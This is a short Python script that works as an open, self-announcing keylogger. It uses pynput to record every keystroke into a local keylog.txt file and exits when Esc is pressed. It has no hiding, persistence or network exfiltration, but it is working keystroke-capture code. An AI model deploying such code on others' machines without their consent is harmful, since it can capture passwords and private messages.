import sys
from pynput.keyboard import Listener, Key
from datetime import datetime

key_list = []

count = 0

log_file = "keylog.txt"

def write_to_file(keys):
    with open(log_file, 'a', encoding="utf-8") as logfile:
        for key in keys:

            k = str(key).replace("'", "")

            if k.find("space") > 0:
                logfile.write(' ')
            elif k.find("enter") > 0:
                logfile.write('\n')
            elif k.find("Key") == -1:
                logfile.write(k)

with open(log_file, 'a', encoding="utf-8") as startup_file:
    startup_file.write(f"\n\n--- logger started: {datetime.now().strftime('%y-%m-%d %H:%M:%S')} ---\n")

def on_press(key):
    global key_list, count

    key_list.append(key)
    count += 1
    #print(f"{key} typed")

    if count >= 10:
        write_to_file(key_list)
        key_list = []
        count = 0

def on_release(key):
    if key == Key.esc:
      
        if key_list:
            write_to_file(key_list)

        print("Exiting...")
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Listening... Close The Terminal To Exit")
    listener.join()
